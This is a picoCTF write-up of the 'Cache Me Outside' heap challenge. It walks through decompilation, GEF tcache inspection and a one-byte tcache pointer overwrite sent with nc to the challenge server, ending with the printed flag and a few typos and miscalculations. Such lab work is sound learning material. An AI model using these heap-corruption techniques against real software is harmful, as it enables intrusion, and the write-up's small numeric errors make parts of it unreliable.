# Cache Me Outside
> challenge description: While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations.

> category: binary exploitaiton; by: madStacks

given a: binary file, libc.so.6 file and makefile

## running the binary

running the binary immediately returns a segmentation fault:
```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/cache_me_outside]
└──╼ $./TEST
Segmentation fault
```
> its probably because of the binary's libc version is not compatible with the libc version of my system :/


fix: use ([pwninit](https://github.com/io12/pwninit) to fetch the linker the binary used:

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/cache_me_outside]
└──╼ $ls
heapedit  libc.so.6  Makefile

┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/cache_me_outside]
└──╼ $ pwninit
bin: ./heapedit
libc: ./libc.so.6

fetching linker
writing solve.py stub

┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/cache_me_outside]
└──╼ $ ls
heapedit  ld-2.27.so  libc.so.6  solve.py  Makefile
```

pwninit downloads the compatible linker with the libc version of the binary so now use LD_PRELOAD to load the libc.so.6 with the linker and execute the binary with this:

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/cache_me_outside]
└──╼ $ LD_PREALOAD=./libc.so.6 ./ld-2.27.so ./heapedit
zsh: segmentation fault  ./heapedit
```

still failing. decompile the code to see more of what's actually going on.

the `main` function had the line `local_90 = fopen("flag.txt","r");` which meant that the binary was expecting a flag.txt file. so:

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/cache_me_outside]
└──╼ $ echo "picoCTF{fakeflag}" > flag.txt

┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/cache_me_outside]
└──╼ $ LD_PREALOAD=./libc.so.6 ./ld-2.27.so ./heapedit
```
use `patchelf` to patch the elf file:
```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/cache_me_outside]
└──╼ $ patchelf  --set-interpreter ./ld-2.27.so ./heapedit

┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/cache_me_outside]
└──╼ $ ./heapedit
You may edit one byte in the program.
Address:
```
## analysing

looking into the decompiled code from ghidra (the `main` function cause it uses interesting functions like `malloc`)

```c

undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined local_a9;
  int local_a8;
  int local_a4;
  undefined8 *local_a0;
  undefined8 *local_98;
  FILE *local_90;
  undefined8 *local_88;
  void *local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined local_60;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  local_90 = fopen("flag.txt","r");
  fgets(local_58,0x40,local_90);
  local_78 = 0x2073692073696874;
  local_70 = 0x6d6f646e61722061;
  local_68 = 0x2e676e6972747320;
  local_60 = 0;
  local_a0 = (undefined8 *)0x0;
  for (local_a4 = 0; local_a4 < 7; local_a4 = local_a4 + 1) {
    local_98 = (undefined8 *)malloc(0x80);
    if (local_a0 == (undefined8 *)0x0) {
      local_a0 = local_98;
    }
    *local_98 = 0x73746172676e6f43;
    local_98[1] = 0x662072756f592021;
    local_98[2] = 0x203a73692067616c;
    *(undefined *)(local_98 + 3) = 0;
    strcat((char *)local_98,local_58);
  }
  local_88 = (undefined8 *)malloc(0x80);
  *local_88 = 0x5420217972726f53;
  local_88[1] = 0x276e6f7720736968;
  local_88[2] = 0x7920706c65682074;
  *(undefined4 *)(local_88 + 3) = 0x203a756f;
  *(undefined *)((long)local_88 + 0x1c) = 0;
  strcat((char *)local_88,(char *)&local_78);
  free(local_98);
  free(local_88);
  local_a8 = 0;
  local_a9 = 0;
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf(&DAT_00400b48,&local_a8);
  printf("Value: ");
  __isoc99_scanf(&DAT_00400b53,&local_a9);
  *(undefined *)((long)local_a8 + (long)local_a0) = local_a9;
  local_80 = malloc(0x80);
  puts((char *)((long)local_80 + 0x10));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

basically, i had to read up on fucking malloc() and free() and tcache and all the other stuff. so in order to understand this challenge's solution, go read up. there's too much to be placed here.

summary:



```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/cache_me_outside] 
└──╼ $gdb heapedit
```


```assembly                     
gef➤  disassemble main
Dump of assembler code for function main:
   0x0000000000400807 <+0>:     push   rbp
   0x0000000000400808 <+1>:     mov    rbp,rsp
   0x000000000040080b <+4>:     sub    rsp,0xc0
   0x0000000000400812 <+11>:    mov    DWORD PTR [rbp-0xb4],edi
   0x0000000000400818 <+17>:    mov    QWORD PTR [rbp-0xc0],rsi
   0x000000000040081f <+24>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000400828 <+33>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040082c <+37>:    xor    eax,eax
   0x000000000040082e <+39>:    mov    rax,QWORD PTR [rip+0x200843]        # 0x601078 <stdout@@GLIBC_2.2.5>
   0x0000000000400835 <+46>:    mov    esi,0x0
   0x000000000040083a <+51>:    mov    rdi,rax
   0x000000000040083d <+54>:    call   0x4006b0 <setbuf@plt>
   0x0000000000400842 <+59>:    lea    rsi,[rip+0x2bf]        # 0x400b08
   0x0000000000400849 <+66>:    lea    rdi,[rip+0x2ba]        # 0x400b0a
   0x0000000000400850 <+73>:    call   0x4006f0 <fopen@plt>
   0x0000000000400855 <+78>:    mov    QWORD PTR [rbp-0x88],rax
   0x000000000040085c <+85>:    mov    rdx,QWORD PTR [rbp-0x88]
   0x0000000000400863 <+92>:    lea    rax,[rbp-0x50]
   0x0000000000400867 <+96>:    mov    esi,0x40
   0x000000000040086c <+101>:   mov    rdi,rax
   0x000000000040086f <+104>:   call   0x4006d0 <fgets@plt>
   0x0000000000400874 <+109>:   movabs rax,0x2073692073696874
   0x000000000040087e <+119>:   movabs rdx,0x6d6f646e61722061
   0x0000000000400888 <+129>:   mov    QWORD PTR [rbp-0x70],rax
   0x000000000040088c <+133>:   mov    QWORD PTR [rbp-0x68],rdx
   0x0000000000400890 <+137>:   movabs rax,0x2e676e6972747320
   0x000000000040089a <+147>:   mov    QWORD PTR [rbp-0x60],rax
   0x000000000040089e <+151>:   mov    BYTE PTR [rbp-0x58],0x0
   0x00000000004008a2 <+155>:   mov    QWORD PTR [rbp-0x98],0x0
   0x00000000004008ad <+166>:   mov    DWORD PTR [rbp-0x9c],0x0
   0x00000000004008b7 <+176>:   jmp    0x400933 <main+300>
   0x00000000004008b9 <+178>:   mov    edi,0x80
   0x00000000004008be <+183>:   call   0x4006e0 <malloc@plt>
   0x00000000004008c3 <+188>:   mov    QWORD PTR [rbp-0x90],rax
   0x00000000004008ca <+195>:   cmp    QWORD PTR [rbp-0x98],0x0
   0x00000000004008d2 <+203>:   jne    0x4008e2 <main+219>
   0x00000000004008d4 <+205>:   mov    rax,QWORD PTR [rbp-0x90]
   0x00000000004008db <+212>:   mov    QWORD PTR [rbp-0x98],rax
   0x00000000004008e2 <+219>:   mov    rax,QWORD PTR [rbp-0x90]
   0x00000000004008e9 <+226>:   movabs rsi,0x73746172676e6f43
   0x00000000004008f3 <+236>:   movabs rdi,0x662072756f592021
   0x00000000004008fd <+246>:   mov    QWORD PTR [rax],rsi
   0x0000000000400900 <+249>:   mov    QWORD PTR [rax+0x8],rdi
   0x0000000000400904 <+253>:   movabs rcx,0x203a73692067616c
   0x000000000040090e <+263>:   mov    QWORD PTR [rax+0x10],rcx
   0x0000000000400912 <+267>:   mov    BYTE PTR [rax+0x18],0x0
   0x0000000000400916 <+271>:   lea    rdx,[rbp-0x50]
   0x000000000040091a <+275>:   mov    rax,QWORD PTR [rbp-0x90]
   0x0000000000400921 <+282>:   mov    rsi,rdx
   0x0000000000400924 <+285>:   mov    rdi,rax
   0x0000000000400927 <+288>:   call   0x400710 <strcat@plt>
   0x000000000040092c <+293>:   add    DWORD PTR [rbp-0x9c],0x1
   0x0000000000400933 <+300>:   cmp    DWORD PTR [rbp-0x9c],0x6
   0x000000000040093a <+307>:   jle    0x4008b9 <main+178>
   0x0000000000400940 <+313>:   mov    edi,0x80
   0x0000000000400945 <+318>:   call   0x4006e0 <malloc@plt>
   0x000000000040094a <+323>:   mov    QWORD PTR [rbp-0x80],rax
   0x000000000040094e <+327>:   mov    rax,QWORD PTR [rbp-0x80]
   0x0000000000400952 <+331>:   movabs rsi,0x5420217972726f53
   0x000000000040095c <+341>:   movabs rdi,0x276e6f7720736968
   0x0000000000400966 <+351>:   mov    QWORD PTR [rax],rsi
   0x0000000000400969 <+354>:   mov    QWORD PTR [rax+0x8],rdi
   0x000000000040096d <+358>:   movabs rcx,0x7920706c65682074
   0x0000000000400977 <+368>:   mov    QWORD PTR [rax+0x10],rcx
   0x000000000040097b <+372>:   mov    DWORD PTR [rax+0x18],0x203a756f
   0x0000000000400982 <+379>:   mov    BYTE PTR [rax+0x1c],0x0
   0x0000000000400986 <+83>:   lea    rdx,[rbp-0x70]
   0x000000000040098a <+387>:   mov    rax,QWORD PTR [rbp-0x80]
   0x000000000040098e <+391>:   mov    rsi,rdx
   0x0000000000400991 <+394>:   mov    rdi,rax
   0x0000000000400994 <+397>:   call   0x400710 <strcat@plt>
   0x0000000000400999 <+402>:   mov    rax,QWORD PTR [rbp-0x90]
   0x00000000004009a0 <+409>:   mov    rdi,rax
   0x00000000004009a3 <+412>:   call   0x400680 <free@plt>
   0x00000000004009a8 <+417>:   mov    rax,QWORD PTR [rbp-0x80]
   0x00000000004009ac <+421>:   mov    rdi,rax
   0x00000000004009af <+424>:   call   0x400680 <free@plt>
   0x00000000004009b4 <+429>:   mov    DWORD PTR [rbp-0xa0],0x0
   0x00000000004009be <+439>:   mov    BYTE PTR [rbp-0xa1],0x0
   0x00000000004009c5 <+446>:   lea    rdi,[rip+0x14c]        # 0x400b18
   0x00000000004009cc <+453>:   call   0x400690 <puts@plt>
   0x00000000004009d1 <+458>:   lea    rdi,[rip+0x166]        # 0x400b3e
   0x00000000004009d8 <+465>:   mov    eax,0x0
   0x00000000004009dd <+470>:   call   0x4006c0 <printf@plt>
   0x00000000004009e2 <+475>:   lea    rax,[rbp-0xa0]
   0x00000000004009e9 <+482>:   mov    rsi,rax
   0x00000000004009ec <+485>:   lea    rdi,[rip+0x155]        # 0x400b48
   0x00000000004009f3 <+492>:   mov    eax,0x0
   0x00000000004009f8 <+497>:   call   0x400700 <__isoc99_scanf@plt>
   0x00000000004009fd <+502>:   lea    rdi,[rip+0x147]        # 0x400b4b
   0x0000000000400a04 <+509>:   mov    eax,0x0
   0x0000000000400a09 <+514>:   call   0x4006c0 <printf@plt>
   0x0000000000400a0e <+519>:   lea    rax,[rbp-0xa1]
   0x0000000000400a15 <+526>:   mov    rsi,rax
   0x0000000000400a18 <+529>:   lea    rdi,[rip+0x134]        # 0x400b53
   0x0000000000400a1f <+536>:   mov    eax,0x0
   0x0000000000400a24 <+541>:   call   0x400700 <__isoc99_scanf@plt>
   0x0000000000400a29 <+546>:   mov    eax,DWORD PTR [rbp-0xa0]
   0x0000000000400a2f <+552>:   movsxd rdx,eax
   0x0000000000400a32 <+555>:   mov    rax,QWORD PTR [rbp-0x98]
   0x0000000000400a39 <+562>:   add    rdx,rax
   0x0000000000400a3c <+565>:   movzx  eax,BYTE PTR [rbp-0xa1]
   0x0000000000400a43 <+572>:   mov    BYTE PTR [rdx],al
   0x0000000000400a45 <+574>:   mov    edi,0x80
   0x0000000000400a4a <+579>:   call   0x4006e0 <malloc@plt>
   0x0000000000400a4f <+584>:   mov    QWORD PTR [rbp-0x78],rax
   0x0000000000400a53 <+588>:   mov    rax,QWORD PTR [rbp-0x78]
   0x0000000000400a57 <+592>:   add    rax,0x10
   0x0000000000400a5b <+596>:   mov    rdi,rax
   0x0000000000400a5e <+599>:   call   0x400690 <puts@plt>
   0x0000000000400a63 <+604>:   mov    eax,0x0
   0x0000000000400a68 <+609>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000400a6c <+613>:   xor    rcx,QWORD PTR fs:0x28
   0x0000000000400a75 <+622>:   je     0x400a7c <main+629>
   0x0000000000400a77 <+624>:   call   0x4006a0 <__stack_chk_fail@plt>
   0x0000000000400a7c <+629>:   leave
   0x0000000000400a7d <+630>:   ret
End of assembler dump.
```
setting breakpoints just after the free() function is used to see the tcache bin.

```assembly
gef➤  b *0x00000000004009a8
Breakpoint 1 at 0x4009a8
gef➤  b *0x00000000004009b4
Breakpoint 2 at 0x4009b4
gef➤  r
Starting program: /home/user/ctfs/picoCTF/binary_exploitation/cache_me_outside/heapedit

Breakpoint 1, 0x00000000004009a8 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x1
$rdx   : 0x00000000602010  →  0x0100000000000000
$rsp   : 0x007fffffffde00  →  0x007fffffffdfa8  →  0x007fffffffe2f0  →  "/home/user/ctfs/picoCTF/binary_exploitation/cache_[...]"
$rbp   : 0x007fffffffdec0  →  0x00000000400a80  →  <__libc_csu_init+0> push r15
$rsi   : 0x00000000602048  →  0x0000000000000000
$rdi   : 0x0
$rip   : 0x000000004009a8  →  <main+417> mov rax, QWORD PTR [rbp-0x80]
$r8    : 0x0000000060249e  →  0x0000000000000000
$r9    : 0x6d6f646e61722061 ("a random"?)
$r10   : 0x3
$r11   : 0x007ffff7a7b9c0  →  <free+0> push r15
$r12   : 0x00000000400720  →  <_start+0> xor ebp, ebp
$r13   : 0x007fffffffdfa0  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde00│+0x0000: 0x007fffffffdfa8  →  0x007fffffffe2f0  →  "/home/user/ctfs/picoCTF/binary_exploitation/cache_[...]"    ← $rsp
0x007fffffffde08│+0x0008: 0x0000000100000000
0x007fffffffde10│+0x0010: 0x0000000000000000
0x007fffffffde18│+0x0018: 0x0000000000000000
0x007fffffffde20│+0x0020: 0x00000007ffffffff
0x007fffffffde28│+0x0028: 0x000000006034a0  →  "Congrats! Your flag is: picoCTF{fake}\n"
0x007fffffffde30│+0x0030: 0x00000000603800  →  0x0000000000000000
0x007fffffffde38│+0x0038: 0x00000000602260  →  0x00000000fbad2488
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400999 <main+402>       mov    rax, QWORD PTR [rbp-0x90]
     0x4009a0 <main+409>       mov    rdi, rax
     0x4009a3 <main+412>       call   0x400680 <free@plt>
 →   0x4009a8 <main+417>       mov    rax, QWORD PTR [rbp-0x80]
     0x4009ac <main+421>       mov    rdi, rax
     0x4009af <main+424>       call   0x400680 <free@plt>
     0x4009b4 <main+429>       mov    DWORD PTR [rbp-0xa0], 0x0
     0x4009be <main+439>       mov    BYTE PTR [rbp-0xa1], 0x0
     0x4009c5 <main+446>       lea    rdi, [rip+0x14c]        # 0x400b18
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "heapedit", stopped 0x4009a8 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4009a8 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
looking at tcache bin

```assembly
gef➤  heap bin tcache
──────────────────────────────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90] count=1  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
```
count=1 -> i think it means the first chunk. addr=0x603800

```assembly
gef➤  c
Continuing.

Breakpoint 2, 0x00000000004009b4 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x2
$rdx   : 0x00000000602010  →  0x0200000000000000
$rsp   : 0x007fffffffde00  →  0x007fffffffdfa8  →  0x007fffffffe2f0  →  "/home/user/ctfs/picoCTF/binary_exploitation/cache_[...]"
$rbp   : 0x007fffffffdec0  →  0x00000000400a80  →  <__libc_csu_init+0> push r15
$rsi   : 0x00000000602048  →  0x0000000000000000
$rdi   : 0x00000000603800  →  0x0000000000000000
$rip   : 0x000000004009b4  →  <main+429> mov DWORD PTR [rbp-0xa0], 0x0
$r8    : 0x0000000060249e  →  0x0000000000000000
$r9    : 0x6d6f646e61722061 ("a random"?)
$r10   : 0x3
$r11   : 0x007ffff7a7b9c0  →  <free+0> push r15
$r12   : 0x00000000400720  →  <_start+0> xor ebp, ebp
$r13   : 0x007fffffffdfa0  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde00│+0x0000: 0x007fffffffdfa8  →  0x007fffffffe2f0  →  "/home/user/ctfs/picoCTF/binary_exploitation/cache_[...]"    ← $rsp
0x007fffffffde08│+0x0008: 0x0000000100000000
0x007fffffffde10│+0x0010: 0x0000000000000000
0x007fffffffde18│+0x0018: 0x0000000000000000
0x007fffffffde20│+0x0020: 0x00000007ffffffff
0x007fffffffde28│+0x0028: 0x000000006034a0  →  "Congrats! Your flag is: picoCTF{fake}\n"
0x007fffffffde30│+0x0030: 0x00000000603800  →  0x0000000000000000
0x007fffffffde38│+0x0038: 0x00000000602260  →  0x00000000fbad2488
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4009a8 <main+417>       mov    rax, QWORD PTR [rbp-0x80]
     0x4009ac <main+421>       mov    rdi, rax
     0x4009af <main+424>       call   0x400680 <free@plt>
 →   0x4009b4 <main+429>       mov    DWORD PTR [rbp-0xa0], 0x0
     0x4009be <main+439>       mov    BYTE PTR [rbp-0xa1], 0x0
     0x4009c5 <main+446>       lea    rdi, [rip+0x14c]        # 0x400b18
     0x4009cc <main+453>       call   0x400690 <puts@plt>
     0x4009d1 <main+458>       lea    rdi, [rip+0x166]        # 0x400b3e
     0x4009d8 <main+465>       mov    eax, 0x0
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "heapedit", stopped 0x4009b4 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4009b4 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bin tcache
──────────────────────────────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90] count=2  ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
```
count=2 -> chunk no.2 addr = 0x603890

looking at both of the chunks:
```assembly
gef➤  x/4xg 0x603800
0x603800:       0x0000000000000000      0x662072756f592021
0x603810:       0x203a73692067616c      0x7b4654436f636970
gef➤  x/4xg 0x603890
0x603890:       0x0000000000603800      0x276e6f7720736968
0x6038a0:       0x7920706c65682074      0x73696874203a756f
```

chunk 1's first 8 bytes are null.

chunk 2's first 8 bytes points to chunk's one address.

it's happening.

```assembly
gef➤  heap bin tcache
──────────────────────────────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90] count=2  ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)

gef➤  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE)
    [0x0000000000602010     00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 9e 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE)
    [0x0000000000602490     70 69 63 6f 43 54 46 7b 66 61 6b 65 7d 0a 00 00    picoCTF{fake}...]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)
    [0x0000000000603890     00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27    .8`.....his won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)
    [0x0000000000603920     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)  ←  top chunk

gef➤  search-pattern 0x603890
[+] Searching '\x90\x38\x60' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602088 - 0x602094  →   "\x90\x38\x60[...]"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffde40 - 0x7fffffffde4c  →   "\x90\x38\x60[...]"
```
0x602088 is the tcache address. 

0x603890 is chunk 2's address (last chunk).

get the offset of both of them.

```assembly
gef➤  p/d 0x602088 - 0x6034a0
$1 = -51443
```

a lot shamelessly copied from: ([featureenvy]https://featureenvy.com/blog/an-introduction-to-tcache-heap-exploits/)

To change the pointer from 0x603890 (last chunk addr) to 0x603800 (first chunk addr, and the tcache bin top pointer) , we need to overwrite the last byte. 
As we are running on x64, which uses LSB, it will be the first byte at that address (as the value 0x603890 on a 64bit LSB system will be stored as 0x9038600000000000). The inputs to the program should result in *(undefined *)((long)-5144 + (long)local_a0) = '0x00'; -5144 for the address, and 0x00 for the new byte.

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/cache_me_outside]
└──╼ ${ echo "-5144"; printf "\x00";} | nc mercury.picoctf.net 31153
You may edit one byte in the program.
Address: Value: lag is: picoCTF{f2d58262f377f31fddf8576b59226f2a}
```

